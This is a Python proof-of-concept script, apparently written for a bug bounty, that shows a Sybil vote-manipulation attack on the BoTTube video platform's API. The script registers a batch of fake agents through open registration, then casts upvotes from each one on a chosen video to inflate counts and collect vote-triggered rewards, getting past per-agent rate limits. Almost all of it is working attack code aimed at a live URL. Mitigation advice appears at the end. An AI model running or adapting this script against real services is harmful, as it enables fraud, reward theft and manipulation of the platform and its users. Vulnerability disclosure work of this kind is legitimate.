#!/usr/bin/env python3
"""
BoTTube PoC #1: Vote Manipulation via Sybil Attack
===================================================
Bounty #247 — Vulnerability 1: Vote Manipulation

Demonstrates that an attacker can:
1. Register multiple fake agents (Sybil identities)
2. Upload a video under one agent
3. Use other fake agents to upvote the video
4. Bypass per-agent rate limits by using multiple API keys

This exploits:
- Open registration (no CAPTCHA, no email verification)
- Per-agent in-memory rate limiting (60 votes/hour per agent)
- No Sybil detection or IP-based vote aggregation for API votes
- The vote-earned reward system (_like_reward_decision) incentivizes this

Usage:
    python3 poc_vote_manipulation.py --target https://bottube.ai
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error


def api_request(base_url, path, method="GET", data=None, api_key=None):
    """Make an API request to BoTTube."""
    url = f"{base_url.rstrip('/')}{path}"
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["X-API-Key"] = api_key

    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())
    except Exception as e:
        return 0, {"error": str(e)}


def register_agent(base_url, name, display_name):
    """Register a new agent and return the API key."""
    status, resp = api_request(base_url, "/api/register", "POST", {
        "agent_name": name,
        "display_name": display_name,
    })
    if status == 200 and resp.get("ok"):
        return resp.get("api_key"), resp
    return None, resp


def create_video(base_url, api_key, title, description="Sybil test video"):
    """
    Upload a video (simulated — actual upload requires multipart/form-data).
    For this PoC, we assume a video already exists or use the API to create one.
    """
    # Note: Actual video upload requires multipart/form-data with file content.
    # This PoC demonstrates the voting manipulation pattern assuming a video exists.
    print(f"  [!] Video upload requires multipart/form-data — skipping actual upload.")
    print(f"  [!] In production, use: curl -X POST -F 'title={title}' -F 'video=@file.mp4' "
          f"-H 'X-API-Key: {api_key}' {base_url}/api/upload")
    return None


def vote_on_video(base_url, api_key, video_id, vote_val=1):
    """Vote on a video using an API key."""
    status, resp = api_request(
        base_url,
        f"/api/videos/{video_id}/vote",
        "POST",
        {"vote": vote_val},
        api_key=api_key,
    )
    return status, resp


def get_video_status(base_url, video_id):
    """Get the current vote counts for a video."""
    status, resp = api_request(base_url, f"/api/videos/{video_id}")
    return resp


def main():
    parser = argparse.ArgumentParser(description="BoTTube Vote Manipulation PoC")
    parser.add_argument("--target", default="http://localhost:5000", help="BoTTube server URL")
    parser.add_argument("--video-id", help="Existing video ID to target (skips registration)")
    parser.add_argument("--num-sybils", type=int, default=5, help="Number of fake agents to create")
    args = parser.parse_args()

    print("=" * 60)
    print("BoTTube Vote Manipulation PoC (Bounty #247)")
    print("=" * 60)

    # Step 1: Register multiple fake agents
    sybil_keys = []
    sybil_names = []

    if args.video_id:
        # Skip registration, use provided video ID
        print(f"\n[*] Using existing video: {args.video_id}")
    else:
        print(f"\n[1] Registering {args.num_sybils} fake agents (Sybil attack)...")
        for i in range(args.num_sybils):
            name = f"sybil_bot_{i}_{int(time.time())}"
            display = f"Sybil Bot #{i}"
            key, resp = register_agent(args.target, name, display)
            if key:
                sybil_keys.append(key)
                sybil_names.append(name)
                print(f"  [+] Registered: {name} (API key: {key[:12]}...)")
            else:
                print(f"  [-] Failed to register {name}: {resp}")
            time.sleep(0.5)  # Avoid rate limit

        if not sybil_keys:
            print("\n[!] No agents registered. Aborting.")
            sys.exit(1)

        print(f"\n  Total Sybil agents: {len(sybil_keys)}")

    # Step 2: If no video ID provided, the attacker uploads one
    if not args.video_id:
        print(f"\n[2] Attacker uploads a video with sybil_bot_0...")
        print(f"  [!] Use --video-id to target an existing video")
        print(f"  [!] In production, the attacker's video would be voted up by all sybils")
        print(f"\n  Attack pattern:")
        print(f"    1. Register N fake agents → get N API keys")
        print(f"    2. Upload 1 video under agent 0")
        print(f"    3. Use agents 1..N-1 to upvote the video")
        print(f"    4. Each upvote may trigger RTC rewards via _like_reward_decision()")
    else:
        video_id = args.video_id
        print(f"\n[2] Voting on video {video_id} with {len(sybil_keys)} sybil agents...")

        for i, key in enumerate(sybil_keys):
            status, resp = vote_on_video(args.target, key, video_id, vote_val=1)
            if status == 200:
                print(f"  [+] Sybil {i} voted: {resp}")
            else:
                print(f"  [-] Sybil {i} failed (HTTP {status}): {resp}")
            time.sleep(0.2)

    # Step 3: Demonstrate the impact
    print(f"\n[3] Impact Analysis:")
    print(f"  - Each agent can vote 60x/hour (rate limit per agent)")
    print(f"  - With {args.num_sybils} agents, effective rate = {args.num_sybils * 60} votes/hour")
    print(f"  - Each upvote triggers _like_reward_decision() — potential RTC earnings")
    print(f"  - No IP-based aggregation for API votes")
    print(f"  - In-memory rate limiter resets on server restart")

    print(f"\n[4] Mitigation Recommendations:")
    print(f"  - Add IP-based vote tracking for API endpoints")
    print(f"  - Implement CAPTCHA or proof-of-work on registration")
    print(f"  - Add device fingerprinting")
    print(f"  - Require email verification for reward-eligible votes")
    print(f"  - Use distributed rate limiting (Redis) instead of in-memory")
    print(f"  - Implement Sybil detection (voting pattern analysis)")

    print(f"\n{'=' * 60}")
    print(f"PoC complete. See bottube_audit_report.md for full analysis.")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
